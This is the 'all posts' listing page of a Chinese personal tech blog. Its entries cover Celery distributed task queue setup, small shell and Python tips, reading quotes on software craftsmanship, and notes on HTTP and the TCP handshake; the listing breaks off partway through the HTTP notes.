<!DOCTYPE html>
<html lang="zh" itemscope
  itemtype="http://schema.org/Blog">

<head>
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" /><title>全部博文 - Obelieve的博客</title>
  <meta property="og:title" content="全部博文" />
  <meta itemprop="headline" content="全部博文" />
  <meta property="og:description" content="" />
  <meta name="description" content="" />
  <meta property="og:url" content="https://www.obelieve.top/blog/" /><meta name="og:type" content="summary" />
  <meta name="keywords" content="注意力, 读书, 工具分享, 纯文本, 英语学习" />
  <meta name="author" content="Obelieve" />
  <meta itemprop="copyrightYear" content=" 2025" />
  <link rel="icon" href="https://www.obelieve.top/site/images/favicon-32x32.png?h=68480d370330a1370abf" type="image/x-icon">
  <link rel="apple-touch-icon" sizes="57x57" href="https://www.obelieve.top/site/images/apple-icon-57x57.png?h=920192bead2a51cc200b">
  <link rel="apple-touch-icon" sizes="60x60" href="https://www.obelieve.top/site/images/apple-icon-60x60.png?h=a7a48024c2427638d967">
  <link rel="apple-touch-icon" sizes="72x72" href="https://www.obelieve.top/site/images/apple-icon-72x72.png?h=bf72d3c24257c21e2c32">
  <link rel="apple-touch-icon" sizes="76x76" href="https://www.obelieve.top/site/images/apple-icon-76x76.png?h=cc4dba10aa538acb3c49">
  <link rel="apple-touch-icon" sizes="114x114" href="https://www.obelieve.top/site/images/apple-icon-114x114.png?h=1aefbd93c1c89c4cbb8a">
  <link rel="apple-touch-icon" sizes="120x120" href="https://www.obelieve.top/site/images/apple-icon-120x120.png?h=409d89ac71c055f60c18">
  <link rel="apple-touch-icon" sizes="144x144" href="https://www.obelieve.top/site/images/apple-icon-144x144.png?h=5deaaef8a0670003fd10">
  <link rel="apple-touch-icon" sizes="152x152" href="https://www.obelieve.top/site/images/apple-icon-152x152.png?h=71161064c00cec1a4f44">
  <link rel="apple-touch-icon" sizes="180x180" href="https://www.obelieve.top/site/images/apple-icon-180x180.png?h=098b2b0d572b07220509">
  <link rel="icon" type="image/png" sizes="192x192" href="https://www.obelieve.top/site/images/android-icon-192x192.png?h=8fc96efc0d93b2ca4d24">
  <link rel="icon" type="image/png" sizes="32x32" href="https://www.obelieve.top/site/images/favicon-32x32.png?h=68480d370330a1370abf">
  <link rel="icon" type="image/png" sizes="96x96" href="https://www.obelieve.top/site/images/favicon-96x96.png?h=0db83734130603a067c1">
  <link rel="icon" type="image/png" sizes="16x16" href="https://www.obelieve.top/site/images/favicon-16x16.png?h=c5a1bcfc63c8f941cce5">
  <meta name="msapplication-TileColor" content="#fffcf9" />
  <meta name="msapplication-TileImage" content="https://www.obelieve.top/site/images/ms-icon-144x144.png?h=5deaaef8a0670003fd10">
  <meta name="theme-color" content="#fffcf9" />
  <meta property="og:site_name" content="Obelieve的博客" />
  
  
  
  <link rel="alternate" type="application/atom+xml" title="全部博文 - Obelieve的博客 RSS" href="https://www.obelieve.top/blog/atom.xml">
  <style>@charset "UTF-8";
html,
body,
p,
dt,
dd,
figure,
fieldset,
blockquote,
legend,
textarea,
pre,
iframe,
hr,
h1,
h2,
h3,
h4,
h5,
h6 {
  margin: 0;
  padding: 0;
}

h1,
h2,
h3,
h4,
h5,
h6 {
  font-size: 100%;
  font-weight: normal;
}

button,
input,
select {
  margin: 0;
}
div {
  box-sizing: border-box;
}

img,
video {
  height: auto;
  max-width: 100%;
}

iframe {
  border: 0;
}

table {
  text-align: justify;
  width: 100%;
  border-collapse: collapse;
  border-spacing: 0;
  margin-bottom: 1.4em;
}
td,
th {
  padding: 0.5em;
  border-bottom: 1px solid var(--colors-divider);
}

.by {
  font-size: 1.175rem;
  padding-bottom: 0.75rem;
  font-weight: 500;
}

.feed-entry li {
  margin-bottom: 0.5rem;
}

/* --reset end -- */
/*
 #d2bf9e
 #fcfcfc
 #fffff8
 #41403e
 backanother #e6ddd0
 divider: rgb(226, 232, 240);
 code back: edf0f3
 rgb(249, 245, 233)
239
#EFEDEA
/* rgba(0, 0, 0, 0.8)*/
/*#fffef8
c35
f9f5e9
ea4c89
fffef8
#f4ecd8;
#FDF6E3
#faf8f1
background-color:rgb(255, 252, 249);
#272629

  --colors-background: #efedea;
  --colors-text: #18181c;
*/
html {
  font-size: 15px;
  box-sizing: border-box;
  /* --colors-text: rgba(68, 64, 60, 0.8); */
  --colors-text: rgba(34, 34, 34);
  --colors-muted: #718096;
  --colors-primary: #cc3355;
  --colors-divider: rgba(0, 0, 0, 0.06);
  --colors-primary-light: rgba(234, 76, 137, 0.5);
  --colors-background: #f7f2ed;
  --colors-code-background: rgba(0, 0, 0, 0.08);
  /* --colors-quote-background: rgba(255, 255, 255, 0.5); */
  /* --colors-quote-background: rgb(0 0 0/3%); */
  --colors-quote-background: hsla(37, 17%, 85%, 0.5);
  --colors-quote-hover-background: rgba(255, 255, 255, 0.7);
  --colors-blue: #1ca9c9;
  --colors-secondary: #14213d;
  --colors-surface: rgba(0, 0, 0, 0.04);
  font-family:
    ui-sans-serif,
    system-ui,
    -apple-system,
    BlinkMacSystemFont,
    segoe ui,
    Roboto,
    helvetica neue,
    Arial,
    noto sans,
    sans-serif,
    apple color emoji,
    segoe ui emoji,
    segoe ui symbol,
    noto color emoji;
  font-feature-settings: normal;
  font-variation-settings: normal;
}

/* Adds dark mode */
@media (prefers-color-scheme: dark) {
  html {
    --colors-background: #202124;
    --colors-text: rgb(236, 237, 238);
    --colors-code-background: rgba(0, 0, 0, 0.08);
    --colors-quote-background: hsl(226, 15%, 17%);
    --colors-quote-hover-background: hsl(226, 15%, 20%);
  }
}
body {
  color: var(--colors-text);
  background-color: var(--colors-background);
}

#root {
  /* margin-left: auto; */
  /* margin-right: auto; */
  /* max-width: 120rem; */
  position: relative;
}

h1,
h2,
h3 {
  padding-top: 1.4rem;
  padding-bottom: 1.4rem;
  margin-bottom: 1rem;
  line-height: 1;
  position: relative;
}
h4,
h5,
h6 {
  padding-top: 1.1rem;
  padding-bottom: 1.1rem;
  margin-bottom: 0.5rem;
  line-height: 1.1;
  font-weight: 400;
  position: relative;
}

.relative {
  position: relative;
}

.bold {
  font-weight: 600;
}
.mb-absolute {
  margin-bottom: -0.8rem;
}

.no-border {
  border: none;
}

.tweet-box {
  box-sizing: border-box;
  overflow: hidden;
  word-wrap: break-word;
  border-width: 1px;
  border-style: solid;
  border-color: var(--colors-divider);
  padding-left: 1rem;
  padding-right: 1rem;
  padding-bottom: 1.5rem;
  padding-top: 1.5rem;
  background: var(--colors-quote-background);
}

.tweet-box .overlay {
  position: absolute;
  left: 0;
  top: 0;
  bottom: 0;
  right: 0;
}
.tweet-box .overlay:hover {
  background-color: var(--colors-quote-hover-background);
}
.tweet-box .inner {
  position: relative;
  pointer-events: none;
  z-index: 1;
}

.tweet-box .inner a {
  pointer-events: all;
  position: relative;
}
p.tweet-content {
  line-height: 1.5rem !important;
  padding-right: 2rem;
  margin-bottom: 0.6rem;
  font-size: 0.9rem !important;
}
.tweet-content a:link,
.tweet-content a:visited {
  -webkit-text-decoration: none;
  text-decoration: none;
  color: rgb(27, 149, 224);
}
.tweet-avatar-wrapper {
  margin-right: 0.5rem;
  margin-bottom: 0;
  width: 48px;
  min-width: 48px;
  border-radius: 9999px;
}
.tweet-icon {
  box-sizing: border-box;
  margin: 0;
  min-width: 0;
  -webkit-text-decoration: none;
  text-decoration: none;
  position: absolute;
  right: 0;
  top: 0.2rem;
}
.tweet-icon-svg {
  width: 25px;
  height: 25px;
  color: rgb(27, 149, 224);
  fill: currentcolor;
}

h1 {
  font-size: 2.4rem;
}

h2 {
  font-size: 1.675rem;
  font-weight: 500;
}

.feed-entry h2 {
  font-size: 1.125rem;
}
.feed-entry h2.entry-title {
  font-size: 1.6rem;
  font-style: normal;
  font-weight: 500;
}

.feed-entry h3 {
  font-size: 1.05rem;
  font-style: normal;
}
p,
li,
ul,
ol {
  font-size: 1rem;
  line-height: 1.8rem;
}

h3 {
  font-size: 1.375rem;
  font-style: italic;
}

article {
  margin-bottom: 4rem;
}
article:last-child {
  margin-bottom: 0;
}
pre {
  background-color: var(--colors-quote-background);
  margin-top: 0px;
  margin-bottom: 1rem;
  padding: 1.5rem 1rem;
  border: 0px;
  border-radius: 0.5rem;
  overflow: auto;
}

code {
  border-radius: 0.25rem;
  padding: 0.375rem 0.5rem;
  background-color: var(--colors-code-background);
}

pre > code {
  font-size: 0.9rem;
  display: block;
}

pre code {
  background: none;
}

code,
pre > code {
  font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
  font-size: 1rem;
  line-height: 1.42;
  -webkit-text-size-adjust: 100%;
  /* Prevent adjustments of font size after orientation changes in iOS. See https://github.com/edwardtufte/tufte-css/issues/81#issuecomment-261953409 */
}

hr {
  display: block;
  height: 1px;
  width: 55%;
  border: 0;
  border-top: 1px solid var(--colors-divider);
  margin: 2rem 0;
  padding: 0;
}

ul {
  margin-bottom: 0.8rem;
}

ul > details > summary {
  margin-left: -1.4rem;
}

p {
  margin-bottom: 1.4rem;
  padding-right: 0;
  vertical-align: baseline;
}

blockquote {
  margin: 2rem 0;
  position: relative;
  border-radius: 10px;
  background-color: var(--colors-quote-background);
  /* background-color: #efefef; */
  /* background-color: hsl(60, 9%, 87%); */
  padding: 1.4rem 1.4rem 0rem 1.4rem;
  /* border-top: 1px solid var(--colors-divider); */
  box-sizing: border-box;
  overflow: auto;
}

/* blockquote p { */
/*   font-size: 1.2rem; */
/*   line-height: 2.1rem; */
/* } */
/**/
/* blockquote p:lang(en) { */
/*   font-size: 1.3rem; */
/* } */
/* blockquote::before{ */
/*   position: absolute; */
/*   content:"\201C";  */
/*   top: 0.875rem; */
/*   font-size: 2.5rem; */
/*   color: var(--colors-primary); */
/*   line-height: .1em; */
/*   vertical-align: -.4em; */
/*   font-weight: bold; */
/*   font-family: Courier, monospace; */
/* } */
/* blockquote > p:first-child { */
/*   text-indent: 2rem; */
/* } */
p,
dl,
ol,
ul {
  line-height: 1.5rem;
}
p {
  line-height: 2.1rem;
}

p:lang(en),
dl:lang(en),
ol:lang(en),
ul:lang(en) {
  font-size: 1.2rem;
  line-height: 1.75rem;
}

button,
input[type="submit"] {
  border-bottom-left-radius: 15px 255px;
  border-bottom-right-radius: 225px 15px;
  border-top-left-radius: 255px 15px;
  border-top-right-radius: 15px 225px;
  transition: all 235ms ease 0s;
  box-shadow: 15px 28px 25px -18px rgb(0 0 0 / 20%);
  transition: all 235ms ease-in-out 0s;
  align-self: center;
  background: 0 0;
  border: 2px solid var(--colors-text);
  color: var(--colors-text);
  cursor: pointer;
  display: inline-block;
  font-size: 1rem;
  outline: 0;
  padding: 0.75rem;
  font-family: Neucha, sans-serif;
}

button,
input[type="submit"]:hover {
  transform: translate3d(0, 2px, 0);
  box-shadow: 2px 8px 8px -5px rgb(0 0 0 / 30%);
}

input[type="url"],
input[type="text"],
input[type="search"] {
  /* -webkit-appearance: none; */
  background: none;
  border: 2px solid var(--colors-text);
  border-bottom-left-radius: 15px 255px;
  border-bottom-right-radius: 225px 15px;
  border-top-left-radius: 255px 15px;
  border-top-right-radius: 15px 225px;
  color: var(--colors-text);
  font-size: 1rem;
  outline: 0;
  padding: 0.75rem;
  box-shadow: 15px 28px 25px -18px rgb(0 0 0 / 20%);

  /* -webkit-border-radius: 0px; */
}
.display-block {
  display: block;
}

input[type="url"]:focus,
input[type="text"]:focus,
input[type="search"]:focus {
  border: 2px solid var(--colors-blue);
}

#search-bar-input {
  width: 80%;
  min-width: 260px;
}

.meilisearch-autocomplete {
  display: block !important;
}
.meilisearch-autocomplete .dsb-dropdown-menu {
  max-height: 400px;
  overflow-y: auto;
  min-width: 300px;
  width: 100%;
}
input:focus:not(:focus-visible) {
  border: 2px solid var(--colors-text);
}
input:focus-visible {
  border: 2px solid var(--colors-blue);
}
.no-underline {
  text-decoration: none;
}

.meilisearch-autocomplete {
  display: block;
}
a {
  word-break: break-all;
}
a:link,
a:visited {
  -webkit-transition: color 200ms ease;
  transition: color 200ms ease;
  text-decoration: underline;
  color: inherit;
  text-decoration-thickness: 1px;
}

:target {
  scroll-margin-top: 56px;
}

.no-underline:link,
.no-underline:visited,
.sidebar a:link,
.sidebar a:visited {
  text-decoration: none;
}
.sidebar {
  overflow-x: visible;
  padding-bottom: 1.4rem;
}
.no-underline:hover,
a:hover {
  color: var(--colors-primary);
  text-decoration: underline;
}

.no-hover-underline:hover {
  text-decoration: none;
}

.muted,
a.muted,
.muted:link,
.muted:visited {
  color: var(--colors-muted);
}

.text {
  font-size: 1.125rem;
}

.text-color,
.text-color:link,
.text-color:visited {
  color: var(--colors-text);
}

.flex {
  display: flex;
}

.flex-3 {
  flex: 3;
}

.flex-1 {
  flex: 1;
}

.flex-1-auto {
  flex: 1 1 auto;
}

.flex-wrap {
  flex-wrap: wrap;
}

.justify-between {
  justify-content: space-between;
}

.justify-center {
  justify-content: center;
}

.items-center {
  align-items: center;
}

.list-none {
  list-style-type: none;
  margin: 0;
  padding: 0;
}

.border-muted {
  border: 1px solid var(--colors-muted);
}

.rounded-full {
  border-radius: 999rem;
}

.rounded {
  border-radius: 0.25rem;
}

.rounded-lg {
  border-radius: 1rem;
}

.w-full {
  width: 100%;
}

.p-sm {
  padding: 0.25rem;
}

.icon {
  width: 2.5rem;
  height: 2.5rem;
  border-radius: 999rem;
}

.inline-block {
  display: inline-block;
}

.menu li:not(:last-child) {
  margin-right: 0.6rem;
}

.m-l-2 {
  margin-left: 0.5rem;
}

.py {
  padding-top: 1.4rem;
  padding-bottom: 1.4rem;
}
.pt0 {
  padding-top: 0;
}

.pb0 {
  padding-bottom: 0;
}
.flex-shrink-0 {
  flex-shrink: 0;
}
.py-sm {
  padding-top: 0.5rem;
  padding-bottom: 0.5rem;
}

.px-sm {
  padding-left: 0.5rem;
  padding-right: 0.5rem;
}

.my {
  margin-top: 1.4rem;
  margin-bottom: 1.4rem;
}

.my-2 {
  margin-top: 2.4rem;
  margin-bottom: 2.4rem;
}

.px {
  padding-left: 1.4rem;
  padding-right: 1.4rem;
}
.px-2xl {
  padding-left: 5rem;
  padding-right: 5rem;
}
.pr-sm {
  padding-right: 0.5rem;
}

.pl-sm {
  padding-left: 0.5rem;
}

.pt {
  padding-top: 1.4rem;
}

.pl {
  padding-left: 1.4rem;
}

.list-none {
  list-style: none;
}

.navbar {
  position: static;
  top: 0;
  left: 0;
  background-color: var(--colors-background);
}

.navbar-inner {
  padding: 0.5rem 1.4rem;
  box-sizing: border-box;
  display: flex;
}

.zola-anchor {
  margin-left: 0.5rem;
  text-decoration: none;
}

.zola-anchor:link,
.zola-anchor:visited {
  text-decoration: none;
}

li.inline {
  display: inline-block;
  margin-right: 0.5rem;
}

.text-bigger {
  font-size: 1rem;
}
.text-lg {
  font-size: 1.5rem;
}

.text-sm {
  font-size: 0.9rem;
}

.text-sm p {
  font-size: 0.9rem;
}
p.text-sm:lang(en),
dl.text-sm:lang(en),
ol.text-sm:lang(en),
ul.text-sm:lang(en) {
  font-size: 0.9rem;
}

.pb {
  padding-bottom: 1.4rem;
}

.pb-lg {
  padding-bottom: 3rem;
}
.pb-sm {
  padding-bottom: 0.5rem;
}

.p0 {
  padding: 0;
}

.no-toc {
  width: auto;
}
.text-center {
  text-align: center;
}

.sidebar ul {
  margin-top: 0;
  padding-left: 1rem;
}

.sidebar li {
  font-size: 1rem;
}

.nav-divider {
  border-right: 2px solid var(--colors-divider);
  height: 24px;
  margin: 0 1rem 0 0rem;
}

.h-card {
  display: flex;
  align-items: center;
}

.display-none {
  display: none;
}

.mb {
  margin-bottom: 1.4rem;
}

.mb-li {
  margin-bottom: 1rem;
}

.mb-lg {
  margin-bottom: 2.4rem;
}

.mr {
  margin-right: 1.4rem;
}

.mr-sm {
  margin-right: 0.5rem;
}

.card {
  /* background: #fff; */
  background: var(--colors-surface);
}

.body-zone {
  padding-left: 1.4rem;
  padding-right: 1.4rem;
}
.header {
  padding-top: 1.4rem;
  max-width: 74rem;
  margin: 0 auto;
}
.post-header {
}
.header-inner {
  max-width: 52rem;
}
.mt {
  margin-top: 1.4rem;
}
.mb-lg {
  margin-bottom: 2.4rem;
}

@media (min-width: 48rem) {
  .navbar {
    position: fixed;
  }
  .nav-divider {
    border-top: 2px solid var(--colors-divider);
    width: 24px;
    margin: 0.6rem 0 1.6rem 0;
    height: 0;
    border-right: none;
  }

  .navbar {
    height: 100%;
    width: 4rem;
    /*
    border-right: 1px solid var(--colors-divider);
 */
  }

  .navbar-inner {
    padding: 1.4rem 0.5rem;
    flex-direction: column;
    height: 100vh;
  }

  .menu {
    flex-direction: column;
  }

  .menu li:not(:last-child) {
    margin-bottom: 1rem;
    margin-right: 0;
  }

  .body-zone {
    padding-left: 5.4rem;
    max-width: 74rem;
    margin: 0 auto;
  }
}

@media (min-width: 52rem) {
  h1::after,
  h2::after,
  h3::after {
    background-color: var(--colors-background);
  }
  .main {
    margin-right: 19rem;
  }
  .main-inner {
    max-width: 44rem;
    padding: 0;
  }
  .no-toc {
    width: 20rem;
  }

  .main-toc {
    display: none;
  }

  .sidebar {
    position: absolute;
    right: 0;
    top: 0;
    border-top: none;
    width: 16rem;
  }

  .sidebar ul {
    border-left: 1px solid var(--colors-divider);
    list-style: none;
  }

  .sidebar li {
    font-size: 0.9rem;
  }

  .sidebar h2,
  .sidebar h3 {
    margin-bottom: 0;
    font-size: 1rem;
    /* font-weight: 400; */
    padding-bottom: 1rem;
    border: none;
  }
}
.index-intro {
  font-size: 1rem;
}
/*备案地址样式*/
a.theme-link-gray {
    text-decoration: none;
    font-size: 12px;
    color: #ccc;
}
.theme-info {
    display: inline-block;
    text-align: center;
    width: 100%;
    padding: 10px 0;
    font-size: 12px;
}</style><style>html {
  font-family: "Noto Serif SC", Roboto, Helvetica, Tahoma, Arial, "PingFang SC",
    "Hiragino Sans GB", "Microsoft YaHei", "Noto Sans CJK",
    "WenQuanYi Micro Hei", sans-serif;
}
</style><link rel="manifest" href="https://www.obelieve.top/site/images/manifest.json">
  
  <script async src="https://www.googletagmanager.com/gtag/js?id=G-W03M6ZDZWG"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag() {
      dataLayer.push(arguments);
    }
    gtag("js", new Date());
    gtag("config", "G-W03M6ZDZWG");
  </script>
  
  
</head>

<body>
  <div id="top"></div>
  <div id="root">
    <div class="body-zone">
      
      <header id="overview" class="pt">
        <div class="">
          <a href="https://www.obelieve.top/">Obelieve&#x27;s Blog</a>
          <span class="divider">&nbsp;&gt;&nbsp;</span>
          <a class="" href="&#x2F;categories/">All Categories</a>
          <span class="divider">&nbsp;&gt;&nbsp;</span>
            全部博文
          </div>
      </header>

      <div class="main-zone relative">
        <div class="main">
          <div class="main-inner">
            


  
  <link rel="alternate" type="application/atom+xml" title="全部博文 - Obelieve的博客 RSS" href="https://www.obelieve.top/blog/atom.xml">
  
  <div class="section-page">
    <div class="h-feed hfeed">
      <div class="display-none">
        <div class="p-name site-title">Obelieve的博客</div>
        <p class="p-summary site-description"></p>
      </div>
      
        
          
  <article class="h-entry hentry feed-entry">
    <h2 class="no-border pb-sm entry-title">
      <a class="no-underline  u-url p-name entry-title" rel="bookmark" href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;blog&#x2F;celeryku&#x2F;">Celery 分布式任务队列</a> <a href="#index-1" id="index-1" class="zola-anchor"></a>
    </h2>
    <h2 id="jing-ji-ren-broker">经纪人（broker）<a class="zola-anchor" href="#jing-ji-ren-broker" aria-label="Anchor link for: jing-ji-ren-broker">🔗</a></h2>
<p>需要发送消息/接收消息，通过第三方消息代理软件，来实现。</p>
<ul>
<li>RabbitMQ</li>
<li>Redis</li>
</ul>
<pre data-lang="shell" class="language-shell "><code class="language-shell" data-lang="shell">#RabbitMQ安装
#Linux系统
sudo apt-get install rabbitmq-server
#Docker
docker run -d -p 5672:5672 rabbitmq
#Redis安装
docker run -d -p 6379:6379 redis
</code></pre>
<h2 id="an-zhuang">安装<a class="zola-anchor" href="#an-zhuang" aria-label="Anchor link for: an-zhuang">🔗</a></h2>
<pre data-lang="shell" class="language-shell "><code class="language-shell" data-lang="shell">pip install celery
</code></pre>
<h2 id="jian-dan-li-zi">简单例子<a class="zola-anchor" href="#jian-dan-li-zi" aria-label="Anchor link for: jian-dan-li-zi">🔗</a></h2>
<pre data-lang="python" class="language-python "><code class="language-python" data-lang="python">#task.py
from celery import Celery

#broker 代理消息的软件 、backend 保存任务结果的后端
app = Celery(&#x27;tasks&#x27;, broker=&#x27;pyamqp:&#x2F;&#x2F;guest@localhost&#x2F;&#x2F; &#x27;,backend=&#x27;rpc:&#x2F;&#x2F;&#x27;)  
#rabbitMQ  pyamqp:&#x2F;&#x2F;guest@localhost&#x2F;&#x2F; 
#redis redis:&#x2F;&#x2F;localhost:6379&#x2F;0
@app.task  
def add(x, y):  
    return x + y
</code></pre>
<h2 id="yun-xing-gong-zuo-fu-wu-qi">运行工作服务器<a class="zola-anchor" href="#yun-xing-gong-zuo-fu-wu-qi" aria-label="Anchor link for: yun-xing-gong-zuo-fu-wu-qi">🔗</a></h2>
<pre data-lang="shell" class="language-shell "><code class="language-shell" data-lang="shell">celery -A task worker --loglevel=INFO 
</code></pre>
<h2 id="diao-yong-ren-wu">调用任务<a class="zola-anchor" href="#diao-yong-ren-wu" aria-label="Anchor link for: diao-yong-ren-wu">🔗</a></h2>
<ul>
<li>使用delay调用任务</li>
</ul>
<pre data-lang="python" class="language-python "><code class="language-python" data-lang="python">from tasks import add
add.delay(4, 4)
</code></pre>
<h2 id="bao-cun-ren-wu">保存任务<a class="zola-anchor" href="#bao-cun-ren-wu" aria-label="Anchor link for: bao-cun-ren-wu">🔗</a></h2>
<ul>
<li>Celery 内置了几个结果后端可供选择： SQLAlchemy / Django ORM， MongoDB 、 Memcached 、 Redis 、 RPC （ RabbitMQ /AMQP）以及 – 或者您可以定义自己的。</li>
</ul>
<pre data-lang="python" class="language-python "><code class="language-python" data-lang="python">#RPC 结果后端 
#backend=&#x27;rpc:&#x2F;&#x2F;&#x27;

from tasks import add
result = add.delay(4,4)
result.ready() #判断结果是否完成
result.get(timeout=1) #获取结果并设置超时1s
result.get() #获取结果 
# result.get(propagate=False) 任务异常时get()也会异常，propagate覆盖操作
</code></pre>
<ul>
<li>error</li>
</ul>
<pre data-lang="shell" class="language-shell "><code class="language-shell" data-lang="shell">AttributeError: &#x27;DisabledBackend&#x27; object has no attribute &#x27;_get_task_meta_for&#x27;. Did you mean: &#x27;get_task_meta_for&#x27;?
# 解决 重启调用任务的Python
</code></pre>
<h2 id="pei-zhi">配置<a class="zola-anchor" href="#pei-zhi" aria-label="Anchor link for: pei-zhi">🔗</a></h2>
<pre data-lang="python" class="language-python "><code class="language-python" data-lang="python"># 单个配置
app.conf.task_serializer = &#x27;json&#x27;
# update 多个配置
app.conf.update(
    task_serializer=&#x27;json&#x27;,
    accept_content=[&#x27;json&#x27;],  # Ignore other content
    result_serializer=&#x27;json&#x27;,
    timezone=&#x27;Europe&#x2F;Oslo&#x27;,
    enable_utc=True,
)
# 配置模块
app.config_from_object(&#x27;celeryconfig&#x27;)
celeryconfig.py
###
broker_url = &#x27;pyamqp:&#x2F;&#x2F;&#x27;
result_backend = &#x27;rpc:&#x2F;&#x2F;&#x27;

task_serializer = &#x27;json&#x27;
result_serializer = &#x27;json&#x27;
accept_content = [&#x27;json&#x27;]
timezone = &#x27;Europe&#x2F;Oslo&#x27;
enable_utc = True
###
python -m celeryconfig # 验证配置模块是否正确
</code></pre>

    <div class="muted text-sm">
      <a title="2025-09-04" class="no-underline u-url p-name entry-title" rel="bookmark" href="https://www.obelieve.top/blog/celeryku/">
        <time class="dt-published published" datetime="2025-09-04">2025.09.04</time>
      </a>
      
      <span>&nbsp;on</span>
      <a title="Notes" class="no-underline p-category" rel="category tag" href="https://www.obelieve.top/categories/notes/">
          Notes
        </a>
      

    </div>
  </article>
  
        
          
  <article class="h-entry hentry feed-entry">
    <h2 class="no-border pb-sm entry-title">
      <a class="no-underline  u-url p-name entry-title" rel="bookmark" href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;blog&#x2F;askill&#x2F;">收集小技巧</a> <a href="#index-2" id="index-2" class="zola-anchor"></a>
    </h2>
    <div class="p-summary entry-summary"><p><strong>shell列出目录树形结构</strong></p>
<pre data-lang="shell" class="language-shell "><code class="language-shell" data-lang="shell">#安装tree
brew install tree
#使用tree命令
tree
#深层结构
tree -L 2
</code></pre>
<p><strong>python 初始化数组</strong></p>
<pre data-lang="py" class="language-py "><code class="language-py" data-lang="py">res = [&quot;&quot; for _ in range(10)]
res[0]=&quot;abc&quot;
</code></pre></div>
      <p><a rel="bookmark" href="https://www.obelieve.top/blog/askill/#continue-reading">
       &rarr;&nbsp; 继续阅读需要: 
  
    1
  
 min
      </a></p>
    <div class="muted text-sm">
      <a title="2025-09-03" class="no-underline u-url p-name entry-title" rel="bookmark" href="https://www.obelieve.top/blog/askill/">
        <time class="dt-published published" datetime="2025-09-03">2025.09.03</time>
      </a>
      
      <span>&nbsp;on</span>
      <a title="Notes" class="no-underline p-category" rel="category tag" href="https://www.obelieve.top/categories/notes/">
          Notes
        </a>
      

    </div>
  </article>
  
        
          
  <article class="h-entry hentry feed-entry">
    <h2 class="no-border pb-sm entry-title">
      <a class="no-underline  u-url p-name entry-title" rel="bookmark" href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;blog&#x2F;quotes&#x2F;">阅读摘要</a> <a href="#index-3" id="index-3" class="zola-anchor"></a>
    </h2>
    <div class="p-summary entry-summary"><blockquote>
<p>“多读而不求甚解，则如驰骋十里洋场，虽珍奇满目，徒惹得心花意乱，空手而归。” —— 朱光潜</p>
</blockquote>
<blockquote>
<p>“我记不住我读过的书,就像我记不住我吃过的饭一样;即便如此,它们塑造了我。” —— 爱默生</p>
</blockquote>
<blockquote>
<p>创建较短的反馈回路能协助测量你的进步。找一个实际问题来解决，这是你的学习，跟之于现实世界，从而为你提供一个较大的反馈回路。 《软件开发者路线图-从学徒到高手》</p>
</blockquote>
<blockquote>
<p>你不应该嫁给任何特定技术，而应该有足够广的技术背景和经验基础，使自己能针对特定的情景选择好的解决方案。《软件开发者路线图-从学徒到高手》</p>
</blockquote>
<blockquote>
<p>不管哪种方式适合你，都不要忘了问问周围的同道中人和指导者，看是否有人掌握的这项技能，并愿意分享所学有时其他人也可能在学习这项技能，跟他们一起工作，你会获得更快的进步，到某个时刻，你将在这个新领域找到你能满意的，能逆水者，这时你就可以做决定了，是继续深挖下去，更有成效，还是将注意力转移到其他技能空白上。《软件开发者路线图-从学徒到 高手》</p>
</blockquote>
<blockquote>
<p>每天只有24小时，你无法将每一项技能都研磨到很高水平，因此你必须学会在他们中间做必要的权衡。《软件开发者路线图从学徒到高手》</p>
</blockquote>
<blockquote>
<p>在能不能看到的地方学习到可以向别人传授技能期间只差一小步。　《软件开发者路线图从学徒到高手》</p>
</blockquote>
<blockquote>
<p>技艺意思是使用可能带有装饰性的手法来制作有用的对象，美术的意思则是制作东西纯粹为了使之美丽。　《软件开发者路线图从学徒到高手》</p>
</blockquote>
<blockquote>
<p>工艺的磨练在于为真能解决实际问题，而不是只为自己踌躇满志。《软件开发者路线图从学徒到高手》</p>
</blockquote>
<blockquote>
<p>公用和美好并不对立，而是相辅相成。一款软件一有用软件，拥有高质量局又越重要，但质量需要时间来保证。你必须在不断在美好和公园之间折中向着适量的质量级别前进。《软件开发者路线图从学徒到高手》</p>
</blockquote>
<blockquote>
<p>写下15项能为你提供动力的事情。稍等一会儿再写下另外五项。列出五项最重要的为你提供动力的事情，把这个列表保存在某个地方，遇到困难时可以看看。《软件开发者路线图从学徒到高手》</p>
</blockquote></div>
      <p><a rel="bookmark" href="https://www.obelieve.top/blog/quotes/#continue-reading">
       &rarr;&nbsp; 继续阅读需要: 
  
    5
  
 min
      </a></p>
    <div class="muted text-sm">
      <a title="2025-09-03" class="no-underline u-url p-name entry-title" rel="bookmark" href="https://www.obelieve.top/blog/quotes/">
        <time class="dt-published published" datetime="2025-09-03">2025.09.03</time>
      </a>
      
      <span>&nbsp;on</span>
      <a title="Notes" class="no-underline p-category" rel="category tag" href="https://www.obelieve.top/categories/notes/">
          Notes
        </a>
      

    </div>
  </article>
  
        
          
  <article class="h-entry hentry feed-entry">
    <h2 class="no-border pb-sm entry-title">
      <a class="no-underline  u-url p-name entry-title" rel="bookmark" href="https:&#x2F;&#x2F;www.obelieve.top&#x2F;blog&#x2F;guan-yu-http&#x2F;">关于HTTP</a> <a href="#index-4" id="index-4" class="zola-anchor"></a>
    </h2>
    <h2 id="yi-ci-httpqing-qiu-lian-lu-guo-cheng">一次HTTP请求链路过程<a class="zola-anchor" href="#yi-ci-httpqing-qiu-lian-lu-guo-cheng" aria-label="Anchor link for: yi-ci-httpqing-qiu-lian-lu-guo-cheng">🔗</a></h2>
<ul>
<li>1.首先是==发送端==通过浏览器输入url链接请求资源，浏览器访问==DNS服务==器查询到IP地址。</li>
<li>2.传输层通过==TCP协议==对HTTP报文进行分段处理，按编号发送给IP网络层。</li>
<li>3.网络层通过==IP协议==进行分发数据包。</li>
<li>4.接收端传输层通过==TCP协议==接收数据包，按编号整合成HTTP数据包。</li>
<li>5.接收端读取==HTTP数据包==处理请求，并给发送HTTP响应报文。</li>
</ul>
<h2 id="tcpsan-ci-wo-shou">TCP三次握手<a class="zola-anchor" href="#tcpsan-ci-wo-shou" aria-label="Anchor link for: tcpsan-ci-wo-shou">🔗</a></h2>
<p>首先是发送端==发送SYN（synchronize）==数据包给接收端，
接收端收到后==回复SYN/ACK(acknowledgement)==数据包给发送端，
然后发送端再==发送ACK==数据包给接收端，连接建立。
